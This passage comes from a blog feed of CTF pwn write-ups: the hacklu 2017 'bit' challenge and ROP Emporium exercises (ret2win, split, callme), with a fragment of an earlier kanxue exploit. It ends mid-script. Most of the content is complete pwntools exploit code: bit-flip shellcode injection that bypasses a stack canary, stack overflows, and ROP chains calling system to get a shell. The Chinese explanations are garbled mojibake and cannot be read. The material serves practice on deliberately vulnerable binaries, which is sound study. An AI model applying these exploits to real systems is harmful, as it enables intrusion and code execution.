:&#x27;)[1:7]+&#x27;\x00&#x27;*2)</span></span><br><span class="line"><span class="comment"># print hex(main_arena_addr)</span></span><br><span class="line"><span class="comment"># #log.info(&quot;main_arena_addr: 0x%x&quot; % hex(main_arena_addr))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> reverse </tag>
            
            <tag> kanxue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hacklu ctf 2017 pwn writeup</title>
      <link href="2017-hacklu-ctf-pwn-writeup.html"/>
      <url>2017-hacklu-ctf-pwn-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="bit"><a href="#bit" class="headerlink" title="bit"></a>bit</h2><p>é€šè¿‡é™æ€åˆ†ææˆ‘ä»¬å¾—åˆ°ä¸€äº›ç»“è®º</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-01.jpg"></a></p><p>è¾“å…¥çš„å‚æ•°ä»¥<code>%lx:%u</code>ç»„æˆï¼Œå³ç”±16è¿›åˆ¶æ•°å’Œæ— ç¬¦å·æ•´å‹ç»„æˆï¼Œä¸­é—´ä»¥å†’å·åˆ†éš”</p><p>æ­¤å¤–ï¼Œåœ¨é™æ€åˆ†æçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ä¼šå‘ç°ç¨‹åºè°ƒç”¨äº†<code>mprotect</code>å‡½æ•°ï¼Œè¿™ä¼šæ„å‘³ç€,æˆ‘ä»¬å°†ç”±æ¡ä»¶å»ä¿®æ”¹å†…å­˜çš„æƒé™ï¼ˆä¹Ÿè®¸æ˜¯ä¸å¯æ‰§è¡Œä¿®æ”¹ä¸ºå¯æ‰§è¡Œï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:00000000004006A7 loc_4006A7:                             ; CODE XREF: main+68â†‘j</span><br><span class="line">.text:00000000004006A7                 mov     rax, cs:qword_601018</span><br><span class="line">.text:00000000004006AE                 and     rax, 0FFFFFFFFFFFF1000h</span><br><span class="line">.text:00000000004006B4                 mov     edx, 7          ; prot</span><br><span class="line">.text:00000000004006B9                 mov     esi, 1000h      ; len</span><br><span class="line">.text:00000000004006BE                 mov     rdi, rax        ; addr</span><br><span class="line">.text:00000000004006C1                 call    _mprotect</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ç»§ç»­å¾€ä¸‹åˆ†æå½“æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªç®—æ˜¯é€»è¾‘æ¼æ´å½“ç‚¹ï¼Œå°±æ˜¯ï¼Œç¨‹åºä¼šå»ä¿®æ”¹å·²ç»å­˜åœ¨äºæŒ‡å®šçš„åœ°å€ä¸­çš„å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006D7                 mov     rdx, cs:qword_601018</span><br><span class="line">.text:00000000004006DE                 movzx   edx, byte ptr [rdx]</span><br><span class="line">.text:00000000004006E1                 mov     ecx, cs:dword_601020</span><br><span class="line">.text:00000000004006E7                 mov     edi, 1</span><br><span class="line">.text:00000000004006EC                 shl     edi, cl</span><br><span class="line">.text:00000000004006EE                 mov     ecx, edi</span><br><span class="line">.text:00000000004006F0                 xor     edx, ecx</span><br><span class="line">.text:00000000004006F2                 mov     [rax], dl</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-02.jpg"></a></p><p>ç¨‹åºåœ¨0x400721ä¼šç”±ä¸€ä¸ªcanary æ£€æŸ¥ï¼Œæ£€æŸ¥ç¨‹åºæ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡º<br>é€šè¿‡<code>checksec</code>çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬ä¹Ÿä¼šå‘ç°ä»–å¼€å¯äº†canaryï¼Œnxï¼Œfull relr0é˜²æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/MyCTF/hacklu/pwn/bit/bit&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å»getshellå‘¢ï¼Ÿ<br>é¢˜ç›®çš„å…³é”®è¿˜æ˜¯åœ¨é‚£ä¸ªæŒ‡å®šåœ°å€ï¼Œç„¶åä¿®æ”¹ä¸€ä½çš„åœ°æ–¹ï¼Œå…¶å®æ€è·¯ä¹Ÿæ˜¯å¾ˆç®€å•ï¼Œæˆ‘ä»¬å»æ³¨å…¥shellcodeåœ¨ä¸€ä¸ªæŒ‡å®šçš„åœ°å€ï¼Œç„¶åä¸æ–­çš„å»ä¿®æ”¹æŒ‡å®šåœ°å€çš„å€¼ï¼Œç›´åˆ°ä¿®æ”¹åˆ°shellcodeçš„åœ°å€ï¼Œç”±äºmprotectçš„ä½œç”¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–ä¸€ä¸ªshell</p><h3 id="exploit-ç¼–å†™"><a href="#exploit-ç¼–å†™" class="headerlink" title="exploit ç¼–å†™"></a>exploit ç¼–å†™</h3><p>ç¬¬ä¸€æ­¥<br>æ€è·¯ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400721                 xor     rsi, fs:28h</span><br><span class="line">.text:000000000040072A                 jz      short locret_400731</span><br><span class="line">.text:000000000040072C                 call    ___stack_chk_fail</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ³¨æ„åˆ°40072aè¿™ä¸ªåœ°æ–¹æœ‰ä¸ªè·³è½¬ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå»patchï¼Œè®©ä»–ä¸æ–­åˆ°è·³è½¬åˆ°mainå‡½æ•°å»</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-03.jpg"></a></p><p><code>io.sendline(&quot;0x40072b:4&quot;)</code></p><p>ç¬¬äºŒæ­¥<br>å½“æˆ‘ä»¬è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬å·²ç»èƒ½å¤ŸæˆåŠŸä¸æ–­å½“è¿”å›åˆ°mainå‡½æ•°ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸€ä¸ªåœ°æ–¹å†™å…¥shellcode</p><p>æˆ‘ä»¬å‘ç°<code>0x400570</code>æ˜¯ä¸ªä¸é”™åˆ°é€‰æ‹©ï¼Œå› ä¸ºè¿™å¿«åŸºæœ¬ä¸ä¼šè¢«è°ƒç”¨åˆ°</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">start = <span class="number">0x00400570</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> shellcode:</span><br><span class="line">    write_value(io, elf, start, c)</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç´§æ¥ç€ï¼Œæˆ‘ä»¬åªéœ€è¦é‡æ–°ä¿®æ”¹40072cåˆ°shellcdoeåœ°å€å°±å¯ä»¥</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_call=<span class="string">&quot;\xe8\x3f\xfe\xff\xff&quot;</span>   <span class="comment"># call 0x400570 (shellcode)</span></span><br><span class="line">start = <span class="number">0x0040072c</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> new_call:</span><br><span class="line">    write_value(io, elf, start, c)</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€åä¼ªé€ canaryåˆ°éªŒè¯<br><code>io.sendline(0x400720:0)</code></p><p>å®Œæ•´exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_value</span>(<span class="params">io, elf, addr, new</span>):</span></span><br><span class="line">    <span class="comment"># write new bytes at addr address.</span></span><br><span class="line">    new = int(new.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    initial = elf.data[addr - <span class="number">0x400000</span>]</span><br><span class="line">    initial = int(initial.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;At &#123;&#125;, replace &#123;&#125; with &#123;&#125;&quot;</span>.format(hex(addr), hex(initial), hex(new)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (initial &amp; (<span class="number">1</span>&lt;&lt;bit)) != (new &amp; (<span class="number">1</span>&lt;&lt;bit)):</span><br><span class="line">            payload = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.format(hex(addr), bit)</span><br><span class="line">            io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    io = process(<span class="string">&#x27;./bit&#x27;</span>)</span><br><span class="line">    <span class="comment">#io = remote(&#x27;flatearth.fluxfingers.net&#x27;, 1744)</span></span><br><span class="line">    gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            break *0x400713</span></span><br><span class="line"><span class="string">            break *0x40072a</span></span><br><span class="line"><span class="string">            break *0x400681</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./bit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    <span class="comment"># patch jmp to loop on main()</span></span><br><span class="line">    <span class="comment">#   0x0040072a      7405           je 0x400731</span></span><br><span class="line">    io.sendline(<span class="string">&quot;0x40072b:4&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    <span class="comment"># write shellcode at 0x00400570</span></span><br><span class="line">    context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">    shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">    raw_input(<span class="string">&quot;make shellcode&quot;</span>)</span><br><span class="line">    start = <span class="number">0x00400570</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> shellcode:</span><br><span class="line">        write_value(io, elf, start, c)</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">    raw_input(<span class="string">&quot;loop~~~~&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># patch callq sym.imp.__stack_chk_fail()</span></span><br><span class="line">    <span class="comment">#   0x0040072c      e8bffdffff     callq sym.imp.__stack_chk_fail</span></span><br><span class="line">    <span class="comment"># Instead we want: call 0xfffffe44  (0xfffffe44 = -444 =&gt; 0x400570)</span></span><br><span class="line">    <span class="comment">#   root@pwn:/# rasm2 &#x27;call 0xfffffe44&#x27;</span></span><br><span class="line">    <span class="comment">#   e83ffeffff</span></span><br><span class="line">    new_call=<span class="string">&quot;\xe8\x3f\xfe\xff\xff&quot;</span></span><br><span class="line">    start = <span class="number">0x0040072c</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> new_call:</span><br><span class="line">        write_value(io, elf, start, c)</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># finally corrupt the cookie!</span></span><br><span class="line">    <span class="comment">#   0x0040071d      488b75f8       movq local_8h, %rsi</span></span><br><span class="line">    <span class="comment">#   0x00400721      644833342528.  xorq %fs:0x28, %rsi</span></span><br><span class="line">    <span class="comment">#   byte:0xf8 value:0 result:0xf9</span></span><br><span class="line">    <span class="comment"># Instead we want:</span></span><br><span class="line">    <span class="comment">#   movq local_7h, %rsi</span></span><br><span class="line">    io.sendline(<span class="string">&quot;0x400720:0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shell!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> hacklu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ropemporium-all-writeup</title>
      <link href="ropemporium-all-writeup.html"/>
      <url>ropemporium-all-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>å‰æ®µæ—¶é—´k0å¸ˆå‚…å¾€ç¾¤é‡Œå‘çš„ä¸€ä¸ªç½‘ç«™ï¼Œç”¨æ¥ç»ƒä¹ ropçš„é¢˜ç›®ï¼ŒèŠ±äº†ç‚¹æ—¶é—´åšäº†<br>è´´ä¸ªå®˜ç½‘é“¾æ¥<br><a href="https://ropemporium.com/">ropemporium</a></p><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h3><p>æ§åˆ¶eipè·³è½¬åˆ°backdoor</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#pwnme_addr  = 0x080485F6</span></span><br><span class="line">ret = <span class="number">0x08048659</span></span><br><span class="line">io  = process(<span class="string">&quot;./ret2win32&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.ljust(<span class="number">44</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">payload += p32(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#pwnme_addr  = 0x080485F6</span></span><br><span class="line">ret = <span class="number">0x0400824</span></span><br><span class="line">io  = process(<span class="string">&quot;./ret2win&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &#x27;&#x27;.ljust(88,&quot;A&quot;)</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="i386-1"><a href="#i386-1" class="headerlink" title="i386"></a>i386</h3><p>æ ˆæº¢å‡ºæ§åˆ¶eipåï¼Œè·³è½¬åˆ°system_plt ç„¶åç»™systemå‡½æ•°ä¼ å‚æ•°ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./split32&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./split32&quot;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">cat_flag = <span class="number">0x0804A030</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&quot;A&quot;</span>*<span class="number">44</span></span><br><span class="line">pay += p32(system_addr)</span><br><span class="line">pay += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">pay += p32(cat_flag)</span><br><span class="line"></span><br><span class="line">io.sendline(pay)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="amd64-1"><a href="#amd64-1" class="headerlink" title="amd64"></a>amd64</h3><p>64ä½ä¸‹éœ€è¦å¯„å­˜å™¨ä¼ å‚æ•°ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°gadget</p><p>å¯¹äºsystem éœ€è¦pop rdi,ret å°†rdiæ¸…ç©ºåï¼Œä¼ å…¥å‚æ•°è¿”å›åˆ°system_addr</p><p>æˆ‘ä»¬å¯ä»¥ç”¨ropgadgetæ¥æ‰¾gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges [14:50:11]</span></span><br><span class="line">$ ROPgadget --binary ./split/split --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040087c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040087e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400880 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400882 : pop r15 ; ret</span><br><span class="line">0x000000000040087b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040087f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006b0 : pop rbp ; ret</span><br><span class="line">0x0000000000400883 : pop rdi ; ret</span><br><span class="line">0x0000000000400881 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040087d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b9 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeMacBook-Pro in ~/MyCTF/rop/rop_emporium_all_challenges [14:48:35]</span></span><br><span class="line">$ cat ./split/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./split&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./split&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400883</span></span><br><span class="line">cat_flag_addr = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><p>è¿™ä¸ªé¢˜ç›®æ˜¯è€ƒéªŒé€‰æ‰‹å¯¹äºå‚æ•°ä¼ é€’å’Œå‡½æ•°è°ƒç”¨çš„çŸ¥è¯†ï¼Œéœ€è¦æŒ‰ç…§è¦æ±‚ï¼Œä»¥ä¸€å®šçš„å‚æ•°ï¼Œä¸€å®šçš„é¡ºåºè°ƒç”¨ä¸‰ä¸ªå‡½æ•°</p><p>###i386</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ cat ./callme32/solve.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./callme32&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pwnme_addr = <span class="number">0x80487B6</span></span><br><span class="line">call_me_one = <span class="number">0x080485C0</span></span><br><span class="line">call_me_two = <span class="number">0x8048620</span></span><br><span class="line">call_me_three = <span class="number">0x080485B0</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;CCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p32(call_me_one)</span><br><span class="line">payload += p32(pwnme_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">2</span>)</span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;break *0x8048801&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;CCCCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB&quot;</span></span><br><span class="line">payload += p32(call_me_two)</span><br><span class="line">payload += p32(pwnme_addr)</span><br><span class="line">payload += 